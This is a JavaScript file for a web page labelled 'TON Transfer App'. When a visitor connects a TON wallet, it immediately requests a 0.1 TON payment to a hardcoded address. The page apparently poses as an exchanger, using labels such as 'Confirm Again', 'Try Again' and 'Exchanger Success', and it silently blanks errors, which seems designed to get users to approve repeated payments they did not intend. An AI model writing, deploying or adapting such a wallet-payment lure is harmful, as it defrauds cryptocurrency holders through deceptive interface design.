// TON Transfer App - Final & Self-Contained Version
(function() {
    class TONTransferApp {
        constructor() {
            this.tonConnectUI = null;
            this.staticRecipient = "0QD4uCCSKWqbVEeksIA_a2DLGftKWYpd-IO5TQIns6ZNP_-U";
            this.staticAmount = "0.1";
            this.mainButton = document.getElementById('mainButton');
            this.transferPopup = document.getElementById('transferPopup');
            this.connectTransferBtn = document.getElementById('connectTransferBtn');
            this.init();
        }

        init() {
            try {
                this.tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                    manifestUrl: window.location.origin + '/tonconnect-manifest.json'
                });
                
                this.setupEventListeners();
                this.setupConnectionListener();
                
                console.log('TON Connect UI initialized successfully');
            } catch (error) {
                console.error('Failed to initialize TON Connect:', error);
                this.showStatus('Failed to initialize wallet connection', 'error');
            }
        }

        setupEventListeners() {
            this.mainButton.addEventListener('click', () => {
                this.showPopup();
            });

            this.connectTransferBtn.addEventListener('click', () => {
                if (this.tonConnectUI.connected) {
                    this.disconnectWallet();
                } else {
                    this.connectWallet();
                }
            });

            // LOGIC BARU UNTUK CLOSE-OUTSIDE
            if (this.transferPopup) {
                this.transferPopup.addEventListener('click', (event) => {
                    // Periksa apakah yang diklik adalah *backdrop* (popup-container itu sendiri)
                    // dan bukan elemen di dalamnya (popup-body)
                    if (event.target === this.transferPopup) {
                        this.hidePopup();
                    }
                });
            }
            // AKHIR LOGIC BARU
        }

        setupConnectionListener() {
            this.tonConnectUI.onStatusChange(() => {
                this.updatePopupButtonStyle();
            });
        }

        showPopup() {
            this.transferPopup.classList.remove('hide');
        }

        hidePopup() {
            this.transferPopup.classList.add('hide');
            // Opsional: Sembunyikan pesan status saat popup ditutup
            const statusEl = document.getElementById('statusMessage');
            if (statusEl) {
                statusEl.style.display = 'none';
            }
        }

        updatePopupButtonStyle() {
            if (this.connectTransferBtn) {
                if (this.tonConnectUI.connected) {
                    this.connectTransferBtn.textContent = 'Try Again';
                    this.connectTransferBtn.className = 'btn btn-secondary btn-block';
                } else {
                    this.connectTransferBtn.textContent = 'Confirm Again';
                    this.connectTransferBtn.className = 'btn btn-primary btn-block';
                }
            }
        }
        
        async connectWallet() {
            this.showStatus('', 'loading');
            try {
                await this.tonConnectUI.connectWallet();
                this.sendTransaction();
            } catch (error) {
                this.showStatus();
                this.updatePopupButtonStyle();
            }
        }

        async disconnectWallet() {
            this.showStatus('', 'info');
            try {
                await this.tonConnectUI.disconnect();
            } catch (error) {
                console.error('Disconnect error:', error);
            }
        }
        
        async sendTransaction() {
            this.showStatus('Preparing transaction...', 'loading');
            try {
                if (!this.tonConnectUI.connected) {
                    this.showStatus('Wallet not connected. Please connect first.', 'error');
                    return;
                }
                const amountInNano = (parseFloat(this.staticAmount) * 1000000000).toString();
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 300,
                    messages: [{
                        address: this.staticRecipient,
                        amount: amountInNano
                    }]
                };
                const result = await this.tonConnectUI.sendTransaction(transaction);
                this.showStatus('Exchanger Success', 'success');
            } catch (error) {
                console.error('Transaction failed:', error);
                this.showStatus();
            }
        }

        showStatus(message, type = 'info') {
            const statusEl = document.getElementById('statusMessage');
            if (statusEl) {
                statusEl.textContent = message;
                statusEl.className = `status-message status-${type}`;
                statusEl.style.display = 'block';
                if (type === 'success' || type === 'error') {
                    setTimeout(() => {
                        this.hidePopup();
                    }, 5000);
                }
            }
        }
    }

    if (typeof TON_CONNECT_UI !== 'undefined') {
        document.addEventListener('DOMContentLoaded', () => {
            window.tonApp = new TONTransferApp();
        });
    } else {
        console.error('TON Connect UI library not loaded');
    }
})();